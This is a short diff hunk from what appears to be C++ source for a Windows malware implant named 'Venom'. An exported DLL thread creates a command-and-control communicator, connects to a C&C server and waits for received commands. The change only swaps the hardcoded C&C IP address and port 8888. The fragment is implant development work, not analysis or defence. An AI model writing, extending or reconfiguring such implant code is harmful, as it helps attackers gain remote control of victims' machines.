@@ -10,7 +10,7 @@ extern "C" __declspec(dllexport)
 DWORD WINAPI VenomThread(LPVOID lpParam)
 {
 	VenomCommands::Command recievedCommand = { 0 };
-	CommunicationHandler::Communicator cncCommunicator("192.168.43.183", 8888);
+	CommunicationHandler::Communicator cncCommunicator("192.168.14.221", 8888);
 	if (cncCommunicator.connectToCnc())
 	{
 		auto uuid = Utils::generateUUID();
